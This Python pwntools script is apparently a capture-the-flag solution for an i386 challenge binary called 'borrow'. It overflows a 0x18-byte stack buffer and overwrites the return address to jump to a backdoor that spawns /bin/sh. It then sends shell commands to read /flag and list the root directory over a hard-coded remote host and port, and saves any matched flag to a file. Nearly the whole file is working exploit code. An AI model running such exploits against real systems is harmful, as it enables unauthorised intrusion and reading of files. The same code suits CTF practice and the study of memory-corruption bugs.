import os
import re
import sys

from pwn import *

try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

HERE = os.path.dirname(os.path.abspath(__file__))

context.log_level = args.LOG or 'info'
context.arch = 'i386'
context.endian = 'little'
context.binary = elf = ELF(os.path.join(HERE, 'borrow'), checksec=False)

HOST = args.HOST or '103.163.47.230'
PORT = int(args.PORT or 35119)
WIN = int(args.WIN, 16) if args.WIN else 0x080498F5   # 远程实测后门；附件里是 0x80491c6
CMD = b'cat /flag;cat /flag*;ls /\n'                  # 跟在 32 字节 payload 后面被 /bin/sh 读到


def start():
    if args.LOCAL:
        return process(elf.path)
    return remote(HOST, PORT, timeout=10)


def exploit(io):
    # 一次性整包发出：多一次 write 会被 read 截断
    payload = flat(
        b'A' * 0x18,      # buf
        b'B' * 4,         # saved ebp
        p32(WIN),         # ret -> check()/system("/bin/sh")
        CMD,              # 留给 shell 读
    )
    log.info('payload(%d) = %s', len(payload), payload.hex())

    out = b''
    try:
        io.send(payload)
        out += io.recvrepeat(1.5)          # banner + 后门剧情
        io.sendline(b'')                   # 补一个回车，让 shell 立刻执行缓冲里的命令
        out += io.recvrepeat(2.5)
    except EOFError:
        log.warning('对端提前关了连接，先看已经收到的内容')

    text = out.decode('utf-8', 'replace')
    if text:
        print(text, end='' if text.endswith('\n') else '\n')
    return out


def main():
    io = start()
    try:
        out = exploit(io)
    except EOFError:
        log.failure('连接被关闭，可能端口已释放')
        return 1

    if not out:
        log.failure('一个字节都没收到，实例可能已释放或端口不对')
        return 1

    m = re.search(rb'HTUCTF\{[^}]*\}|flag\{[^}]*\}', out)
    if m:
        log.success('FLAG = %s', m.group().decode())
        dst = os.path.join(HERE, 'flag.txt')
        if os.path.exists(dst):
            open(dst + '.old', 'wb').write(open(dst, 'rb').read())   # 老内容留档，别被覆盖
        open(dst, 'wb').write(m.group())
        return 0

    if args.i:
        io.interactive()
    else:
        log.warning('没匹配到 flag，加 -i 交互看看（或手动 cat /flag）')
    io.close()
    return 0


if __name__ == '__main__':
    sys.exit(main())
